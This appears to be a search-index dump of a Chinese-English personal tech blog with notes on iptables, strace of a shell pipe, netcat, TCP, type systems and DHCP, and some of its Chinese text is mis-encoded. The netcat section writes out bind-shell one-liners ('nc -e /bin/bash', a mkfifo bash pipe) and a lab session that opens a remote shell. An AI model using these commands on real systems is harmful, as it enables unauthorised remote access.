bits)":"0x4(4)"},"title":"master-ip"},"/blog/master-iptables/":{"data":{"chain#chain":" each of these tables are composed of a few default chains. These chains allow you to filter packets at various points.\nPREROUTING INPUT OUTPUT FORWARD POSTROUTING ","iptables-examples#iptables examples":" -t ä¸æŒ‡å®šï¼Œé»˜è®¤æ˜¯ filter table. ä¸ºå•¥? filter å¸¸ç”¨å‘—\nNew-chain Xdelete-chain List Insert Append Delete Replace Flush Policy jump match module source destination numeric ä¸è¿›è¡Œ reverse dns lookup protocol input interface onput interface\nlist rules iptables -L â€“line-numbers\niptables -A INPUT -p tcp â€“dport 22 -j LOG\niptables -D INPUT -p tcp â€“dport 22 -j LOG\nappend rules iptables -A INPUT -s 221.194.47.0/24 -j REJECT delete rules iptables -D INPUT -s 221.194.47.0/24 -j REJECT iptables -D INPUT 12 iptables -D INPUT 9 iptables -F iptables -F INPUT insert/replace rules iptables -I INPUT 1 -s 114.114.114.114 -j ACCEPT iptables -R INPUT 1 -s 59.45.175.10 -J ACCEPT protocals/modules iptables -A INPUT -p tcp -m tcp -dport 22 -s 59.45.175.0/24 -j DROP iptables -A INPUT -p tcp -m multiport -dports 22,49101 -s 59.45.175.0/24 -j DROP iptables -A input -p icmp -m icmp -icmp-type 17 -j DROP connection tracking module change default policy iptables -P INPUT DROP iptables -t nat -P INPUT DROP custom chain iptables -N ssh-rules iptables -A ssh-rules -s 18.130.0.0./16 -j ACCEPT iptables -A ssh-rules -s 18.11.0.0/16 -j ACCEPT iptables -A ssh-rules -j DROP iptables -A INPUT -p tcp -m tcp â€“dport 22 -j ssh-rules ","iptables-ä¸‰è¦ç´ #iptables ä¸‰è¦ç´ ":"","references#References":" depth-guide-iptables-linux-firewall-å¼ºçƒˆæ¨è iptables-è§£æ iptables iptables-extensions ip-forward https://manned.org/iptables ","table#table":" tables allow you to do very specific things with packets. å¯¹æ•°æ®åŒ…åšç‰¹å®šçš„å¤„ç†\nfilter table default mangle table nat table raw table ","target#target":"terminating target ä¸€æ—¦åŒ¹é…ç«‹åˆ»å†³å®šä¸€ä¸ªç½‘ç»œåŒ…çš„æœ€ç»ˆå‘½è¿ã€‚å¦‚ ACCEPT,DROP,REJECT chain ä¸Šçš„ target ä¾æ¬¡åŒ¹é…, ä¸€æ—¦åŒ¹é…å°±æ‰§è¡Œå…³è”çš„æ“ä½œã€‚åŒ¹é…ä¸åˆ°æ‰§è¡Œé»˜è®¤çš„ target å¯ä»¥é…ç½® default policy, ä¹Ÿæ˜¯ä¸€ä¸ª target æ‰€æœ‰ chain çš„ default policy æ˜¯ ACCEPT non-terminating target å¦‚ LOG è®°å½• kernel æ—¥å¿— ","æ•°æ®åŒ…#æ•°æ®åŒ…":"æ•°æ®åŒ… æ¥æ”¶ å‘é€ è½¬å‘ è·¯ç”±å™¨ ","é»˜è®¤çš„-iptables-é…ç½®#é»˜è®¤çš„ iptables é…ç½®":" æ‰€æœ‰ chain çš„é»˜è®¤ policy éƒ½æ˜¯ ACCEPT\n[root@node96 ~]# iptables -t filter -L -n --line-numbers Chain INPUT (policy ACCEPT) num target prot opt source destination Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t nat -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain INPUT (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination Chain POSTROUTING (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t mangle -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain INPUT (policy ACCEPT) num target prot opt source destination Chain FORWARD (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination Chain POSTROUTING (policy ACCEPT) num target prot opt source destination [root@node96 ~]# iptables -t raw -L -n --line-numbers Chain PREROUTING (policy ACCEPT) num target prot opt source destination Chain OUTPUT (policy ACCEPT) num target prot opt source destination "},"title":"Master Iptables"},"/blog/master-linux-pipe/":{"data":{"":"","file-descriptor#file descriptor":"","pipeline-æµç¨‹è¯¦ç»†åˆ†æ#pipeline æµç¨‹è¯¦ç»†åˆ†æ":"âœ… Step 1: Pipe Creation 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 The parent shell creates a pipe with two file descriptors: 3: Read end (for wc) 4: Write end (for cat) pipe2() is a modern variant of pipe() that supports flags. Here, no flags are set (0), so it behaves like pipe(). âœ… Step 2: Forking Child Processes First Child (PID 27641) â€“ runs cat 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 27641 The parent shell uses clone() to create a child process. This is how fork() is implemented in modern glibc â€” via clone() with SIGCHLD. Second Child (PID 27642) â€“ runs wc -l 27640 13:23:49.478608 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, ...) = 27642 The parent shell creates a second child process. Again, this is a fork() under the hood. âœ… Step 3: Redirecting File Descriptors First Child (PID 27641) â€“ cat 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.475737 close(4) = 0 Redirects stdout (FD 1) to the write end of the pipe (FD 4). Closes the redundant FD 4 after duplication. Second Child (PID 27642) â€“ wc 27642 13:23:49.480811 dup2(3, 0) = 0 27642 13:23:49.482849 close(3) = 0 Redirects stdin (FD 0) to the read end of the pipe (FD 3). Closes the redundant FD 3 after duplication. âœ… Step 4: Executing Commands cat Process (PID 27641) 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], ...) = 0 Replaces child process with cat /etc/passwd. Now cat writes its output to the pipe. wc Process (PID 27642) 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], ...) = 0 Replaces child process with wc -l. Now wc reads input from the pipe and counts lines. âœ… Step 5: Parent Shell Cleanup 27640 13:23:49.474244 close(4) = 0 27640 13:23:49.479006 close(3) = 0 The parent shell closes both ends of the pipe. This ensures the reader (wc) knows when the writer (cat) has finished (when all writers have closed the pipe). âœ… Step 6: Process Exit Both child processes exit cleanly:\n[pid 27641] +++ exited with 0 +++ [pid 27642] +++ exited with 0 +++ And finally, the parent shell exits:\n[pid 27640] +++ exited with 0 +++ ","references#References":" IO redirection in shell sys-call-clone sys-call-dup2 sys-call-pipe2 sys-call-execve supported by qwen ","sh-ç³»ç»Ÿè°ƒç”¨è¿½è¸ª#\u003ccode\u003esh\u003c/code\u003e ç³»ç»Ÿè°ƒç”¨è¿½è¸ª":"file descriptor A file descriptor, or FD, is a positive integer that refers to an input/output source. æŒ‡å‘ I/O æº,ä¸å…³å¿ƒå…·ä½“çš„æºæ˜¯ä»€ä¹ˆ, è¿™å°±æ˜¯æŠ½è±¡\næ‰€è°“ I/O redirection ä¸è¿‡æ˜¯å¯¹æŒ‡å®šçš„ FD å¤åˆ¶è€Œå·²\nsh ç³»ç»Ÿè°ƒç”¨è¿½è¸ª shell pipeline æµç¨‹ complete lifecycle of a shell pipeline (cat /etc/passwd | wc -l) executed via sh.\nâœ… pipe2() (pipe creation, kernel managed buffer, pipe[0] read pipe[1] write) âœ… clone() (Linux process creation, replaces fork()) âœ… dup2() (redirects stdin/stdout) âœ… execve() (runs cat and wc -l) strace -f -tt -s 1000 -o pipe.log -e trace=pipe2,clone,execve,dup2,close sh -c 'cat /etc/passwd | wc -l' 27640 13:23:49.436915 execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"cat /etc/passwd | wc -l\"], 0x7ffcc4e072a0 /* 65 vars */) = 0 27640 13:23:49.446359 close(3) = 0 27640 13:23:49.452650 close(3) = 0 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77cc40b30a10) = 27641 27640 13:23:49.474244 close(4) = 0 27641 13:23:49.474851 close(3) = 0 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.475737 close(4) = 0 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], 0x6292fba9d0f8 /* 65 vars */ \u003cunfinished ...\u003e 27640 13:23:49.477420 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD \u003cunfinished ...\u003e 27641 13:23:49.477659 \u003c... execve resumed\u003e) = 0 27640 13:23:49.478608 \u003c... clone resumed\u003e, child_tidptr=0x77cc40b30a10) = 27642 27640 13:23:49.479006 close(3) = 0 27640 13:23:49.480741 close(-1 \u003cunfinished ...\u003e 27642 13:23:49.480811 dup2(3, 0) = 0 27640 13:23:49.481370 \u003c... close resumed\u003e) = -1 EBADF (Bad file descriptor) 27642 13:23:49.482849 close(3) = 0 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], 0x6292fba9d128 /* 65 vars */) = 0 27641 13:23:49.486693 close(3) = 0 27642 13:23:49.487874 close(3) = 0 27642 13:23:49.491607 close(3) = 0 27641 13:23:49.494576 close(3) = 0 27642 13:23:49.500190 close(3) = 0 27642 13:23:49.502045 close(3) = 0 27642 13:23:49.504291 close(3) = 0 27641 13:23:49.507177 close(3) = 0 27641 13:23:49.515626 close(3) = 0 27641 13:23:49.516854 close(1) = 0 27641 13:23:49.517974 close(2) = 0 27642 13:23:49.519465 close(0 \u003cunfinished ...\u003e 27641 13:23:49.519562 +++ exited with 0 +++ 27642 13:23:49.519778 \u003c... close resumed\u003e) = 0 27642 13:23:49.520356 close(1 \u003cunfinished ...\u003e 27640 13:23:49.520949 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=27641, si_uid=1000, si_status=0, si_utime=0, si_stime=0} --- 27642 13:23:49.521080 \u003c... close resumed\u003e) = 0 27642 13:23:49.521383 close(2) = 0 27642 13:23:49.523033 +++ exited with 0 +++ 27640 13:23:49.523476 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=27642, si_uid=1000, si_status=0, si_utime=0, si_stime=0} --- 27640 13:23:49.527449 +++ exited with 0 +++ strace è¿‡æ»¤ grep -E 'pipe2|clone|dup2|execve' pipe.log 27640 13:23:49.436915 execve(\"/usr/bin/sh\", [\"sh\", \"-c\", \"cat /etc/passwd | wc -l\"], 0x7ffcc4e072a0 /* 65 vars */) = 0 27640 13:23:49.471471 pipe2([3, 4], 0) = 0 27640 13:23:49.472226 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x77cc40b30a10) = 27641 27641 13:23:49.475308 dup2(4, 1) = 1 27641 13:23:49.476204 execve(\"/usr/bin/cat\", [\"cat\", \"/etc/passwd\"], 0x6292fba9d0f8 /* 65 vars */ \u003cunfinished ...\u003e 27640 13:23:49.477420 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD \u003cunfinished ...\u003e 27641 13:23:49.477659 \u003c... execve resumed\u003e) = 0 27640 13:23:49.478608 \u003c... clone resumed\u003e, child_tidptr=0x77cc40b30a10) = 27642 27642 13:23:49.480811 dup2(3, 0) = 0 27642 13:23:49.483297 execve(\"/usr/bin/wc\", [\"wc\", \"-l\"], 0x6292fba9d128 /* 65 vars */) = 0 è¿›ç¨‹ ID Parent Shell (sh): PID 27640 Child 1 (cat): PID 27641 Child 2 (wc): PID 27642 æ•°æ®æµå‘ Pipe Setup:\npipe2([3,4]) creates a communication channel: 3: Read end (used by wc) 4: Write end (used by cat) Child 1 (cat):\ndup2(4, 1) â†’ Redirects catâ€™s stdout to the pipe. execve(\"cat\", ...) â†’ cat writes /etc/passwd to the pipe. Child 2 (wc):\ndup2(3, 0) â†’ Redirects wcâ€™s stdin to the pipe. execve(\"wc\", ...) â†’ wc reads from the pipe and counts lines. Parent Cleanup:\nCloses both ends of the pipe (close(3) and close(4)) to prevent resource leaks. æ•°æ®æµå¯è§†åŒ– +-------------------+ | Parent Shell | | (PID 27640) | +-------------------+ | | ğŸ”µ pipe2([3,4], 0) â–¼ +-------------------+ | Pipe: | | Read: FD 3 | | Write: FD 4 | +-------------------+ | | ğŸŸ¢ clone(SIGCHLD) â†’ PID 27641 | ğŸŸ¢ clone(SIGCHLD) â†’ PID 27642 â–¼ +-------------------+ +-------------------+ | Child 27641 (cat) | | Child 27642 (wc) | +-------------------+ +-------------------+ | ğŸŸ¡ dup2(4, 1) | | ğŸŸ¡ dup2(3, 0) | | ğŸ”´ close(4) | | ğŸ”´ close(3) | | ğŸŸ  execve(\"cat\") | | ğŸŸ  execve(\"wc\") | | â†’ Writes to pipe | | â†’ Reads from pipe | +-------------------+ +-------------------+ | â†‘ | | +--------------------------+ Data flow via pipe ","æ¶‰åŠç³»ç»Ÿè°ƒç”¨æ€»ç»“#æ¶‰åŠç³»ç»Ÿè°ƒç”¨æ€»ç»“":" PID Action Description 27640 pipe2([3, 4], 0) Creates pipe 27640 clone(...) Forks first child (PID 27641) 27640 clone(...) Forks second child (PID 27642) 27641 dup2(4, 1) Redirects stdout to pipe write end 27642 dup2(3, 0) Redirects stdin to pipe read end 27641 execve(\"cat\", ...) Replaces child with cat 27642 execve(\"wc\", ...) Replaces child with wc -l 27640 wait() Waits for both children to finish "},"title":"Master Linux Pipe"},"/blog/master-netcat/":{"data":{"basic-syntax-and-options#\u003cstrong\u003eBasic Syntax and Options\u003c/strong\u003e":"","common-use-cases#\u003cstrong\u003eCommon Use Cases\u003c/strong\u003e":"Mastering the nc (Netcat) Command in LinuxNetcat (nc) allows you to read and write data across network connections using TCP or UDP protocols.\nTable of Contents Mastering the nc (Netcat) Command in Linux Table of Contents What is Netcat? Basic Syntax and Options Common Use Cases 1. Port Scanning ç«¯å£æ‰«æ 2. Creating a Chat Server èŠå¤©æœåŠ¡å™¨ 3. File Transfer ä¼ è¾“æ–‡ä»¶ 4. Port Forwarding ç«¯å£è½¬å‘ 5. Banner Grabbing æœåŠ¡ç±»å‹æŠ“å– 6. Testing UDP Services UDP æµ‹è¯• 7. Reverse Shell (Ethical Hacking) åå‘ shell æœåŠ¡ç«¯1 å®¢æˆ·ç«¯1 æœåŠ¡ç«¯2 å®¢æˆ·ç«¯2 References What is Netcat? Netcat is a versatile tool for:\nNetwork debugging Port scanning File transfers Simple proxying Banner grabbing Reverse shells It works with both TCP (default) and UDP protocols. Some versions include ncat (Nmap Project) or cryptcat (with encryption).\nBasic Syntax and Options nc [options] hostname port Common Options:\n-z: Zero-I/O mode, report connection status only,Scan mode (no data exchange). -v: --verbose output -u: --udp UDP protocol -l: --listen Bind and listen for incoming connections -p: --source-port Specify source port to use -w: --wait, Connect timeout -k: --keep-open, accept multiple connections in listen mode -n: --no-dns, skip DNS resolution (faster). -e: --exec Executes the given command Common Use Cases 1. Port Scanning ç«¯å£æ‰«æ Check if a port or range of ports is open:\n# Scan a single port nc -zv github.com 80 Connection to github.com port 80 [tcp/http] succeeded! # Scan ports 20-100 nc -zv example.com 20-100 2. Creating a Chat Server èŠå¤©æœåŠ¡å™¨ Set up a simple chat between two machines:\n# Listener (Server) nc -lvp 1234 # Client (Connect to Server) nc 192.168.1.10 1234 Type messages on either side and press Enter. Exit with Ctrl+C.\n3. File Transfer ä¼ è¾“æ–‡ä»¶ Transfer files over a network:\n# Sender (Client) nc -nv example.com 4444 \u003c file.txt # Receiver (Server) nc -lvnp 4444 \u003e received.txt Directory Example:\n# Compress and send tar -czf - /path/to/dir | nc -lvp 5555 # Receive and extract nc 192.168.1.10 5555 | tar -xzf - 4. Port Forwarding ç«¯å£è½¬å‘ Forward traffic from local port 8080 to a remote server:\n# Local Forwarder nc -lvp 8080 | nc remotehost 80 ä¾‹å­\n[root@node96 ~]# nc -lvp 9999 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::9999 Ncat: Listening on 0.0.0.0:9999 Ncat: Connection from 10.10.200.97. Ncat: Connection from 10.10.200.97:50360. aaaaaaa [root@node97 ~]# nc -lvp 8888 | nc 10.10.200.96 9999 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::8888 Ncat: Listening on 0.0.0.0:8888 Ncat: Connection from 10.10.200.97. Ncat: Connection from 10.10.200.97:34254. [root@node97 ~]# nc 10.10.200.97 8888 aaaaaaa Bidirectional Forwarding (Advanced):\nmkfifo pipe nc -lvp 8080 \u003c pipe | nc remotehost 80 \u003e pipe 5. Banner Grabbing æœåŠ¡ç±»å‹æŠ“å– Retrieve service banners for reconnaissance:\n[root@node96 ~]# nc -v 10.10.200.96 22 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:22. SSH-2.0-OpenSSH_7.4 6. Testing UDP Services UDP æµ‹è¯• Test UDP-based services (e.g., DNS):\n[root@node96 ~]# nc -uvz 1.1.1.1 53 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 1.1.1.1:53. Ncat: UDP packet sent successfully Ncat: 1 bytes sent, 0 bytes received in 2.02 seconds. Note: UDP is connectionless, so responses may vary.\n7. Reverse Shell (Ethical Hacking) åå‘ shell æœåŠ¡ç«¯1 [root@node96 ~]# nc -l -vv -p 5879 -e /bin/bash Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::5879 Ncat: Listening on 0.0.0.0:5879 å®¢æˆ·ç«¯1 [root@node97 ~]# nc -v 10.10.200.96 5879 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:5879. ip a 1: lo: \u003cLOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens33: \u003cBROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc pfifo_fast state UP group default qlen 1000 link/ether 00:0c:29:17:86:e5 brd ff:ff:ff:ff:ff:ff inet 10.10.200.96/16 brd 10.10.255.255 scope global noprefixroute ens33 valid_lft forever preferred_lft forever inet 10.10.123.234/16 scope global secondary ens33 valid_lft forever preferred_lft forever inet6 fe80::c51e:7f4e:355f:57d2/64 scope link noprefixroute valid_lft forever preferred_lft forever æœåŠ¡ç«¯2 rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/bash -i 2\u003e\u00261 | nc -l 8888 \u003e /tmp/f å®¢æˆ·ç«¯2 å‡ºç°äº†æœåŠ¡ç«¯çš„å‘½ä»¤è¡Œæ“ä½œç«¯, ç›¸å½“å±é™©çš„\n[root@node97 ~]# nc -v 10.10.200.96 8888 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Connected to 10.10.200.96:8888. [root@node96 ~]# hostname hostname node96 ","mastering-the-nc-netcat-command-in-linux#Mastering the \u003ccode\u003enc\u003c/code\u003e (Netcat) Command in Linux":"","references#References":" è¿™äº›Linuxå‘½ä»¤ï¼Œä¸ä¼šæœ‰äººæ•™ä½ ï¼ ncat ","table-of-contents#\u003cstrong\u003eTable of Contents\u003c/strong\u003e":"","what-is-netcat#\u003cstrong\u003eWhat is Netcat?\u003c/strong\u003e":""},"title":"Master Netcat"},"/blog/master-pki/":{"data":{"certificate#certificate":"certificate ç›®æ ‡ï¼šç»‘å®š public key å’Œ nameã€‚ä¸€åˆ‡å›´ç»•ç€è¿™ä¸ªç›®æ ‡æ¥å±•å¼€ã€‚","references#References":" å¼ºçƒˆæ¨è-everything-pki ç¿»è¯‘ç‰ˆ-everything-pki ubuntu-trust-store-location decode-an-ssl-certificate csr-åœ¨çº¿è§£æ github-public-key dns-caa-record X.509 ","å›¾è§£#å›¾è§£":""},"title":"Master Pki"},"/blog/master-tcp/":{"data":{"basic-data-transfer#basic data transfer":"","connections#connections":" Each connection is uniquely specified by a pair of sockets identifying its two sides.(source ip, source port),(destination ip, destination port)\nsockets sequence numbers window size ","flow-control#flow control":" window size ","multiplexing#multiplexing":" socket (ip, port) ","reliability#reliability":" sequence number acknowledgement ","tcp-header-format#TCP header format":" The Transmission Control Protocol (TCP) is intended for use as a highly reliable host-to-host protocol between hosts in packet-switched computer communication networks, and in interconnected systems of such networks.\nTCP header format","tcp-å»ºç«‹è¿æ¥ç›®çš„#TCP å»ºç«‹è¿æ¥ç›®çš„":" äº¤æ¢é€šä¿¡åŒæ–¹çš„ ISN (Initial Sequence Number) å‡¡æ˜¯å æ®åºåˆ—å·çš„ä»»ä½•TCPæŠ¥æ–‡ï¼Œä¸€å®šå¯¹æ–¹ç¡®è®¤ï¼Œå¦‚æœæ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œä¼šä¸€ç›´é‡ä¼ ï¼Œç›´åˆ°è¾¾åˆ°è§„å®šçš„ä¸Šé™æ¬¡æ•°ã€‚ syn , data , fin å æ® sequence number éœ€è¦ç¡®è®¤. ack ä¸å æ® sequence number ä¸éœ€è¦ç¡®è®¤.","å‚è€ƒé“¾æ¥#å‚è€ƒé“¾æ¥":" TCP three way handshake 1 TCP three way handshake 2 rfc793 "},"title":"master-tcp"},"/blog/master-type-system/":{"data":{"ambiguous-interpretation#Ambiguous Interpretation":"","bits-are-just-bits#Bits Are Just Bits":"","bridging-human-intent---machine-execution#Bridging Human Intent \u0026lt;-\u0026gt; Machine Execution":"","how-types-work-under-the-hood#How Types Work \u0026ldquo;Under the Hood\u0026rdquo;ï¼Ÿ":"","java-ä»£ç ç†è§£#java ä»£ç ç†è§£":"","no-guardrails#No Guardrails":"ä¸ºå•¥éœ€è¦ type system?type å°±æ˜¯å¥‘çº¦ At the hardware level, the machine does not know types in the way humans or high-level programming languages do. ç¡¬ä»¶çº§åˆ«å°±æ˜¯ç”µä¿¡å·äº†ã€‚type è¿™ç§æ¦‚å¿µä¸å­˜åœ¨ã€‚ Bits are just bits (0s and 1s), and the CPU/memory has no intrinsic understanding of â€œintegers,â€ â€œstrings,â€ or â€œobjects.â€ But types exist in programming languages to impose structure on those raw bits, guiding both the programmer and the compiler/interpreter on how to interpret and manipulate data safely and meaningfully. Bridging Human Intent \u003c-\u003e Machine Execution Types act as a contract\nFor humans: They make code readable and intentional (e.g., int age vs. string name). For compilers: They generate correct, optimized machine code (e.g., using ADD vs. FADD for integers vs. floats). ç¼–è¯‘å™¨æ ¹æ®æ•°æ®ç±»å‹ä½¿ç”¨ç›¸åº”çš„æŒ‡ä»¤ For safety: They prevent invalid operations (e.g., multiplying a string by a file handle). ç¡¬ä»¶è§†è§’ä¸‹çš„æ•°æ®Bits Are Just Bits æŒ‰ç…§ç¡¬ä»¶ç”µè·¯çš„è®¾è®¡ï¼Œå°±æ˜¯ä¸€ç³»åˆ—ç”µä¿¡å·è€Œå·²ã€‚\nNo inherent types æ²¡æœ‰æ‰€è°“çš„ç±»å‹ã€‚\nTo the CPU, memory is a giant array of bytes. When you write 42 (integer) or â€œhelloâ€ (string), the machine sees only binary patterns like 00101010 or 01101000 01100101 01101100 01101100 01101111.\nOperations are â€œtype-agnosticâ€ ç»™å®šä¸€ä¸ªæŒ‡ä»¤ï¼ŒæŒ‡ä»¤å°±ä¼šæŒ‰ç…§è®¾è®¡å¥½çš„åŠŸèƒ½æ¥ä½¿ç”¨ bits, ä¸ç®¡è¿™ä¸ª bits åˆ°åº•æ˜¯å•¥ã€‚\nThe CPU executes instructions (e.g., ADD, MOV) based on the binary values in registers, not their â€œmeaning.â€ For example:\nADD treats bits as integers (using arithmetic circuits). MOV copies bits blindly from one location to another. The same bits could represent an integer, a float, or part of a string, depending on context. How Types Work â€œUnder the Hoodâ€ï¼ŸTypes are a human/compiler abstraction layered on top of raw bits\nHereâ€™s how they translate to the machine:\nCompiler/Interpreter Assigns Meaning A high-level language (e.g., C, Python) assigns semantic meaning to bits using types. For example: int x = 42: The compiler allocates 4 bytes (32 bits) and encodes 42 as 00101010â€¦, then enforces that x can only be used in integer operations (e.g., x + 5). float y = 3.14: The same 4 bytes are interpreted as an IEEE 754 floating-point number. char* s = â€œhelloâ€: The compiler stores the ASCII codes for each character in memory and treats the variable as a pointer to the first byte. Without types, the compiler wouldnâ€™t know how to generate correct machine code (e.g., integer vs. floating-point arithmetic instructions).\nRuntime Type Tracking (Dynamically Typed Languages) In languages like Python or JavaScript, types are checked at runtime. For example: x = 42 # Interpreter tags `x` as an integer internally. x = \"hello\" # Later, the tag changes to \"string.\" The interpreter keeps metadata (e.g., type tags) to track what the bits represent. This adds overhead but allows flexibility.\nWhat Happens Without High-Level Type Abstractions?If you remove types from the equation (e.g., programming in raw assembly or using memory pointers without safeguards):\nAmbiguous Interpretation The same bits can be misused as different types, leading to chaos:\n// C code (no runtime type checking)\nint x = 42; float* y = (float*)\u0026x; // Reinterpret the bits of `x` as a float. printf(\"%f\", *y); // Prints nonsense: 42 as a float â‰ˆ 5.9e-44. Undefined Behavior â€¢ Memory corruption: Writing a string into memory allocated for an integer:\nint* arr = malloc(sizeof(int) * 5); arr[5] = 100; // Buffer overflow (undefined behavior). â€¢ Security vulnerabilities: Treating data as executable code (e.g., injection attacks).\nNo Guardrails â€¢ You could â€œaddâ€ a string to a file handle, and the CPU would try to execute it, resulting in crashes or garbage output.","square-å­—èŠ‚ç æŸ¥çœ‹#Square å­—èŠ‚ç æŸ¥çœ‹":"javap -c Square\nclass Square { Square(); Code: 0: aload_0 1: invokespecial #1 // Method java/lang/Object.\"\u003cinit\u003e\":()V 4: return static int square(int); Code: 0: iload_0 1: iload_0 2: imul 3: ireturn static float square(float); Code: 0: fload_0 1: fload_0 2: fmul 3: freturn static long square(long); Code: 0: lload_0 1: lload_0 2: lmul 3: lreturn } å¯ä»¥çœ‹åˆ°ç¼–è¯‘å™¨æ ¹æ® type ä½¿ç”¨äº†å¯¹åº”çš„ mul æŒ‡ä»¤\nå¯ä»¥çœ‹åˆ° int ç±»å‹å¯¹åº”çš„æŒ‡ä»¤æœ‰ imul å¯ä»¥çœ‹åˆ° float ç±»å‹å¯¹åº”çš„æŒ‡ä»¤æœ‰ fmul å¯ä»¥çœ‹åˆ° long ç±»å‹å¯¹åº”çš„æŒ‡ä»¤æœ‰ lmul ","squarejava#Square.java":" class Square { static int square(int num) { return num * num; } static float square(float num){ return num * num; } static long square(long num){ return num * num; } } ","type-å°±æ˜¯å¥‘çº¦#\u003ccode\u003etype\u003c/code\u003e å°±æ˜¯å¥‘çº¦":"","undefined-behavior#Undefined Behavior":"","what-happens-without-high-level-type-abstractions#What Happens Without High-Level Type Abstractions?":"","ä¸ºå•¥éœ€è¦-type-system#ä¸ºå•¥éœ€è¦ type system?":"","æ€»ç»“#æ€»ç»“":"Types are a tool for humans, not the machine. Without them, programming would require manually managing every bit and operation, akin to writing assembly code for every programâ€”a recipe for bugs and inefficiency","ç¡¬ä»¶è§†è§’ä¸‹çš„æ•°æ®#ç¡¬ä»¶è§†è§’ä¸‹çš„æ•°æ®":""},"title":"Master Type System"},"/blog/my-source-list/":{"data":{"":" https://arthurchiao.art/ https://alexanderell.is/posts/ https://blog.ryanlevick.com/ https://brennan.io/blog/ https://bhoot.dev/ https://chsasank.com/ https://codewords.recurse.com/ https://crockford.com/blog.html https://devconnected.com/ https://joearms.github.io/ https://jitwxs.cn/ https://kiosk007.top/ https://kunststube.net/ https://linuxize.com/post/ https://matt.might.net/ https://www.marcobehler.com/ https://natanyellin.com/posts/ https://robertovitillo.com/blog https://research.swtch.com/ Russ Cox https://strikefreedom.top/ https://serhack.me/blog/ https://www.0xffffff.org/ https://www.booleanworld.com/ https://www.jmeiners.com/ https://www.timdbg.com/ https://www.taniarascia.com/ https://manybutfinite.com/archives/ èƒ¡æ¶‚è¯´ ç§‹é£çš„ç¬”è®° æœ±åŒå° é™ˆæ ‘ä¹‰ "},"title":"My Source List"},"/blog/my-tool-box/":{"data":{"digital#digital":"","explorer#explorer":" AST WASM compiler assembler brainfuck-visualizer ","java#java":"","video--audio#video \u0026amp; audio":"","windows#windows":"video \u0026 audio lux ttsmaker è¡¨æ ¼ ascii-table å…ƒç´ å‘¨æœŸè¡¨ digital socpk é¢œè‰² ä¸­å›½è‰² ä¼ ç»Ÿè‰² ç½‘ç»œ WiFi è¿æ¥å¡ æµ·åº•ç”µç¼† å·¥å…·é›† æ²¹å°çŒ´ å¼€å‘å·¥å…· ç¥ç§˜çš„çƒ­å¿ƒç½‘å‹ æ³¢ç‰¹å·¥å…·ç«™ java JDK å¯åŠ¨ç›˜åˆ¶ä½œ https://rufus.ie/zh/ https://ventoy.net/ windows sysinternals ","å¯åŠ¨ç›˜åˆ¶ä½œ#å¯åŠ¨ç›˜åˆ¶ä½œ":"","å·¥å…·é›†#å·¥å…·é›†":"","ç¼–ç¨‹#ç¼–ç¨‹":" cron-expression crontab explainshell ","ç½‘ç»œ#ç½‘ç»œ":"","è¡¨æ ¼#è¡¨æ ¼":"","éšç§#éšç§":" Cover Your Tracks browserleaks ","é¢œè‰²#é¢œè‰²":""},"title":"My Tool Box"},"/blog/name-id-pairs/":{"data":{"name-id-pairs#name id pairs":"name id pairs å¯¹äº OS æ¥è¯´ï¼Œid æ›´é‡è¦ã€‚\nsymbolic name(human readable name) number name(low level name) service name port user name user id process name process id host name ip address file name inode number signal name signal number syscall name syscall number "},"title":"Name Id Pairs"},"/blog/network-dhcp/":{"data":{"":"","dhcp-æ­¥éª¤#DHCP æ­¥éª¤":"","references#References":"DHCP æ­¥éª¤ Discover Offer Request ACK References 127.0.0.1 å’Œ 0.0.0.0 DHCP-Basics full-packet-friday-dhcp dynamic-host-configuration-protocal dhcp-rfc 